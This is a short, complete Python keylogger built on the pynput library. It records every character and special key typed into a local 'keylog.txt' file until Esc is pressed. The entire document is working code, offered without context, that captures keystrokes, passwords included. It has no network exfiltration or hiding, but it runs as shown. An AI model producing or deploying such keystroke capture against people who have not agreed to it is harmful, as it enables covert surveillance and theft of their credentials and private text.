from pynput import keyboard

# File to store logged keys
LOG_FILE = "keylog.txt"

# Function to handle key presses
def on_press(key):
    try:
        with open(LOG_FILE, "a") as file:
            # Log regular characters
            file.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE, "a") as file:
            # Log special keys (e.g., Enter, Space)
            file.write(f"[{key}]")

# Function to handle key release (optional)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when ESC is pressed
        return False

# Set up the key listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()